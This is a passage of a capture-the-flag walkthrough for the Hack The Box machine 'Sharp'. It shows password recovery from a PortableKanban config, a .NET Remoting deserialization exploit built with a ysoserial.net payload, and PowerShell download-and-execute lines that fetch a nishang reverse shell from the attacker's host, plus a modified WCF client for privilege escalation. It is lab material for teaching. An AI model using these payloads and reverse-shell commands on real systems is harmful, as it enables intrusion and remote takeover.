        fr--r--r--           292352 Sat Nov 14 13:57:04 2020    ServiceStack.Redis.dll
        fr--r--r--           411648 Sat Nov 14 13:57:04 2020    ServiceStack.Text.dll
        fr--r--r--          1050092 Sat Nov 14 13:57:04 2020    User Guide.pdf
        .\kanban\Plugins\*
        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .
        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..
```

To retrieve all of the files and save it to our machine, we can use

``` bash
smbget -R smb://10.10.10.219/kanban
```

We downloaded some stuff for Windows, which may have to (de)compile. Before going to a Windows VM, however, I'd rather read through the files and docs and see if there are any quick and easy ways

#### Kaban Files

use ack to search for strings that we think may be helpful - username, password, port, email, etc.

``` bash
apt-get install ack

┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# ack -i "password"
PortableKanban.pk3
1:{"Columns":[{"Id":"4757781032fd41b2a4511822e2c08850","SortOrder":0,"Name":"Demo","Limit":0,"TaskOrder":{"SortType":"None","Parameters":[{"Field":"Completed","SortOrder":"Descending"},{"Field":"Deadline","SortOrder":"Ascending"},{"Field":"Priority","SortOrder":"Descending"},{"Field":"Topic","SortOrder":"Ascending"},{"Field":"Person","SortOrder":"Ascending"}]},"AutoComplete":false,"ResetCompleted":false,"TimeStamp":637409769443121006}],"Tasks":[{"Id":"33870d6dfe4146718ba0b2c9f7bc05cf","SeriesId":"00000000000000000000000000000000","SortOrder":"oGdBKcFw","ColumnId":"4757781032fd41b2a4511822e2c08850","TopicId":"00000000000000000000000000000000","PersonId":"00000000000000000000000000000000","Text":"New Task","Priority":"Low","Created":"\/Date(1605380100000+0100)\/","CreatedBy":"e8e29158d70d44b1a1ba4949d52790a0","Modified":"\/Date(-62135596800000)\/","ModifiedBy":"00000000000000000000000000000000","Deadline":"\/Date(1605308400000+0100)\/","HasDeadline":false,"Completed":"\/Date(1605308400000+0100)\/","CompletedBy":"00000000000000000000000000000000","Done":false,"Canceled":false,"Link":"","Subtasks":[],"Tags":[],"Estimate":0,"Progress":0,"Points":0,"Comments":[],"CustomFields":{},"TimeStamp":637409769542424146}],"TimeTracks":[],"Persons":[],"Topics":[],"Tags":[],"Views":[],"Users":[{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731},{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613}],"ServiceMessages":[],"CustomFieldDescriptors":[],"MetaData":{"Id":"ffffffffffffffffffffffffffffffff","SchemaVersion":"4.2.0.0","SchemaVersionModified":"\/Date(1605380100000+0100)\/","SchemaVersionModifiedBy":"e8e29158d70d44b1a1ba4949d52790a0","SchemaVersionChecked":"\/Date(-62135596800000-0000)\/","SchemaVersionCheckedBy":"00000000000000000000000000000000","TimeStamp":637409769001918463}}
```

 - Think of ack like grep . As default, Ack trawls through files in our current working directory and searches for the string we want.

 - Sometimes, grep can be complicated to get right, and also isolates a string from its wider context, which can sometimes be misleading in my opinion

take a closer look at what we have here in PortableKanban.pk3, we have encrypted passwords and some usernames too, with their respective privileges.

``` bash
Administrator
ID: e8e29158d70d44b1a1ba4949d52790a0
Encrypted Password: "k+iUoOvQYG98PuhhRC7/rg=="

Lars
ID: 0628ae1de5234b81ae65c246dd2b4a21
Encrypted Password: "Ua3LyPFM175GN8D3+tqwLA=="
```

#### Read the Docs

before trying to reverse engineer the .exe file to find out how the passwords are hashed, it's best to read the user guide that accompanied these SMB files: firefox "User Guide.pdf"

 - Some important notes I take from reading the docs:

page 1: As the program is 'portable', it's at our mercy if we change config files

page 3: Blank passwords shouldn't be used - which says to me, it CAN be used but isn't advised

pages 11: There is the only one default user: “Administrator” with blank password.

page 18: suggests that if you forget your password, just take the portable .exe to a different directory and try to execute it as Admin?

pp 22: "Passwords are hidden by default in Setup/Users tab."

Reading the docs, it seems like need to relocate to a Windows VM, sign in as Administrator,and try and find the decrypted passwords that may be waiting in Users?

zipped the entire directory that we downloaded from the SMB share, and moved it to my windows VM.

#### Sign in as Admin

When start the .exe, this interesting pop up let's know that data from a pk3.bak is recovered. Intresting

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb138.jpg)

when try to sign in as Admin with a blank password, don't sign in! So much for an easy ride.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb139.jpg)

#### Config Manipulation

return back to that first pop up: that the data was recovered from the pk3.bak file. When we open it, we can see it's the same file we got the encrypted passwords from earlier

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb140.jpg)

If the .exe calls on this backup file to restore it's own configurations, we may be able to remove the existing password fields. It may possibly let us sign straight in - let's try.

What we need to do is remove this entire directory and the un-zip it fresh again. Now go and manipulate the pk3.bak file.

If we open the pk3.bak file in notepad, and remove this value for the password so it shows we should gain access . Be sure to Save the file as "All Files", and let it replace any file it wants.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb141.jpg)

Now, if we run the .exe and let it call on the pk3 backup, it will load the "blank password" and let's us sign in as Administrator

#### Password Hunt

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb142.jpg)

From our notes earlier, we gathered that we need to find the Users tab, as this is where we might find a password. Click on the cog for setup. Then move to the Users tab

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb143.jpg)

we get the password for Lars: G123HHrth234gRG

#### Make Lars Admin

Before we go and take these creds back to the SMB share, to see if we have access to anything new, let's experiment with making Lars admin.

Delete the directory for the exe again. Unzip a fresh install, and edit the pk4.bak file again to change Lars to Admin

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb144.jpg)

And what do you know, if we make Lars admin in the config file, sign in, and look at the passwords again, we get the Admin's too: G2@$btRSHJYTarg (spolier: we don't do much with the admin's password)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb145.jpg)


#### Test the Creds

Armed with credentials, we can begin a second round of enumeration back in our Kali VM

``` bash
#users;passwords
administrator : "G123HHrth234gRG"
lars : "G2@$btRSHJYTarg"
```

If we put these into a respective users and passwords list in kali, and then run crackmapexec we can see if we have any valid creds:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# crackmapexec smb 10.10.10.219 -u usernames.txt -p passwords.txt
SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G123HHrth234gRG STATUS_LOGON_FAILURE 
SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG
```

Lars' creds are valid on the SMB share, so let's go and see if we have access to anything new.

#### SMB enum II

Running smbmap again with valid creds shows us we have access to a dev share:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219
[+] IP: 10.10.10.219:445        Name: localhost                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS
```

Running the previous command with -R lists out what awaits us in the dev share. There isn't too much here, so let's download it and take a look:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/sharp]
└─# smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 -R
[+] IP: 10.10.10.219:445        Name: localhost                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        .\dev\*
        dr--r--r--                0 Sun Nov 15 06:30:13 2020    .
        dr--r--r--                0 Sun Nov 15 06:30:13 2020    ..
        fr--r--r--             5632 Sun Nov 15 05:25:01 2020    Client.exe
        fr--r--r--               70 Sun Nov 15 08:59:02 2020    notes.txt
        fr--r--r--             4096 Sun Nov 15 05:25:01 2020    RemotingLibrary.dll
        fr--r--r--             6144 Mon Nov 16 06:55:44 2020    Server.exe
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-364-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e4-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-190-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-428-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-254-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-274-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132546763363573536.2940.DefaultAppDomain.wsmprovhost
        kanban                                                  NO ACCESS
```

``` bash
smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG
```

Looks like we're gonna zip this new downloaded dev directory and pop it over to our Windows VM again

#### De-compiling

To figure out what these binaries are doing, we need to recompile them. dnspy is one such tool for decompile .exes: https://github.com/dnSpy/dnSpy

Once you have dnspy, open up client.exe and start opening up the tabs on the left

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb146.jpg)

The tab we're looking for is called remote sample, as this contains some interesting creds just hanging out

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb147.jpg)

The key information is that we now have creds for the service on port 8888, which we found earlier in our nmap scan. We also have the directory/API to call on when we make the request too (SecretSharpDebugApp......)

 - debug : "SharpApplicationDebugUserPassword123!"

#### In Search of an Exploit

In this same dnspy tab, we can take the top string "Remoting.Channels.Tcp" and google it and ask for an exploit. The third option on google is a github with a possible exploit: https://github.com/tyranid/ExploitRemotingService

 - An excellent pre-compiled can be found here: https://github.com/parteeksingh005/ExploitRemotingService_Compiled

#### Compile the Exploit

compile this github exploit in visual studio community.

 - If it's too difficult to make a working binary, I'd suggest you use the pre-compiled binary above

Install the necessary libraries that visual studio asks for, and then traverse around the directories and files on the left until you find ExploitRemotingService.csproj.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb148.jpg)


Click build and watch the output, which should tell you where the resultant client .exe is located.

#### Create a reverse shell

We need to complete a number of steps here, which aren't complicated but do need to be in a particular order:

1. Download python for windows, and start a python web server: python -m SimpleHTTPServer 80

2. Download netcat for windows and listen on the port for a reverse shell: nc.exe -lvp 4321

3. Download a nishang reverse shell, save it, and add this one-liner at the end of the file to have the victim execute the reverse shell:
Invoke-PowerShellTcp -Reverse -IPAddress [Your IP] -Port [Your listner port]

4. Produce a serialised reverse shell by downloading Yososerial

5. Connect to the victim machine via the binary we compiled, with the attached the commands for a reverse shell.

The first two steps are easy, so let's focus on the last two.

#### ysoserial.net

We can find Yososerial here: https://github.com/pwntester/ysoserial.net/releases/download/v1.34/ysoserial-1.34.zip

What we're going to do here is produce a serialised command to reach into our web server and grab the reverse shell:

``` bash
ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"
```

and we got

``` bash
AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL
```

We're now going to take the long output and include it to the binary we built.

#### Remote connection .exe

And now let's run the binary with the serialised output:

``` bash
ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAGsvYyBwb3dlcnNoZWxsIC1jIElFWChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKQYHAAAAA2NtZAQFAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIDAAAACERlbGVnYXRlB21ldGhvZDAHbWV0aG9kMQMDAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJCAAAAAkJAAAACQoAAAAECAAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYLAAAAsAJTeXN0ZW0uRnVuY2AzW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBgwAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CgYNAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGDgAAABpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcwYPAAAABVN0YXJ0CRAAAAAECQAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JDwAAAAkNAAAACQ4AAAAGFAAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYVAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBCgAAAAkAAAAGFgAAAAdDb21wYXJlCQwAAAAGGAAAAA1TeXN0ZW0uU3RyaW5nBhkAAAArSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQYaAAAAMlN5c3RlbS5JbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpCAAAAAoBEAAAAAgAAAAGGwAAAHFTeXN0ZW0uQ29tcGFyaXNvbmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQkMAAAACgkMAAAACRgAAAAJFgAAAAoL
```

``` bash
System.InvalidCastException: Unable to cast object of type 'System.Collections.Generic.SortedSet`1[System.String]' to type 'System.Runtime.Remoting.Messaging.IMessage'.
   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage& responseMsg, ITransportHeaders& responseHeaders, Stream& responseStream)
```

Ignore the error output. What you want to focus on is your python web server. We should see the victim machine pick up our reverse shell file.

``` bash
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.219 - - [10/Jan/2021 01:57:04] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```

And we have a shell as Lars

``` bash
D:\1.pentesttool\内网渗透>nc.exe -lvp 4321
listening on [any] 4321 ...
connect to [10.10.14.5] from DESKTOP-9LSPC40 [10.10.10.219] 49678
Windows PowerShell running as user lars on SHARP
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
sharp\lars
PS C:\Windows\system32> net user

User accounts for \\SHARP

-------------------------------------------------------------------------------
Administrator            debug                    DefaultAccount
Guest                    lars                     WDAGUtilityAccount
The command completed successfully.
```

and got the user flag

``` bash
PS C:\users\lars\desktop> dir


    Directory: C:\users\lars\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/7/2021   2:17 PM             34 user.txt


PS C:\users\lars\desktop> type user.txt
dc4569514afab6cd583ad1259b69eb38
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb149.jpg)

#### Lars Shell

We can get the user flag and then enumerate the machine to find a way to escalate our privileges.In Lars' Documents, directory there's some stuff to do with wcf.

 - Let's bring the files back onto our Windows VM, and read them.

``` bash
PS C:\users\lars\documents\wcf> dir


    Directory: C:\users\lars\documents\wcf


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
d-----       11/15/2020   1:40 PM                .vs                                                                  
d-----       11/15/2020   1:40 PM                Client                                                               
d-----       11/15/2020   1:40 PM                packages                                                             
d-----       11/15/2020   1:40 PM                RemotingLibrary                                                      
d-----       11/15/2020   1:41 PM                Server                                                               
-a----       11/15/2020  12:47 PM           2095 wcf.sln
```

#### Transfer

We can zip the wcf directory:

``` bash
PS C:\users\lars\documents> dir


    Directory: C:\users\lars\documents


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
d-----       11/15/2020   1:40 PM                wcf                                                                  


PS C:\users\lars\documents> Compress-Archive -LiteralPath C:\users\lars\Documents\wcf -DestinationPath C:\users\lars\Documents\wcf.zip
PS C:\users\lars\documents> dir


    Directory: C:\users\lars\documents


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
d-----       11/15/2020   1:40 PM                wcf                                                                  
-a----         1/9/2021   6:09 PM       11598452 wcf.zip
```

And now, we can move the zipped folder to the dev smb we had remote access to:

``` bash
move-item -path C:\users\lars\Documents\wcf.zip -destination c:\dev
```

Back on our windows VM, we can load the Dev share up:

``` bash
C:\Users\Administrator>net use X: \\10.10.10.219\dev
为“10.10.10.219”输入用户名: lars
输入 10.10.10.219 的密码:
命令成功完成。
#Puts lars and his password in: G123HHrth234gRG
```

And if you look in your Windows VM network, the victim's dev SMB share will be there waiting as DriveX

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb150.jpg)


#### Exploring WCF

If we open up the .sln file that was in the WCF directory, we can read how it works in Visual Studio

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb151.jpg)

We can look further into the Client's main function

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb152.jpg)

This seems to connect to port 8889 running on the victim machine, which we will assume is a service running as a privileged user.

 - The plan is then to add some malicious code for a reverse shell, re-compile this into a binary and upload it to the victim, and then execute it to receive a privileged shell.

#### Build the Exploit

We can add a line underneath the last console.Write line . This will repeat the same way we got the User shell.

``` bash
Console.WriteLine(wcfService.InvokePowerShell("iex (new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"));
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb153.jpg)


Then build the solution, and note the directories that the client and remote .dll are.

#### Transfer II

Unfortunately, I wasn't able to just chuck these files back into the SMB share we networked too.However I didn't try very hard to make it work.

Instead, I coped the client and wcf remote dll back into the directory where I set up my python web server, and then pulled both of these onto the victim machine

``` bash
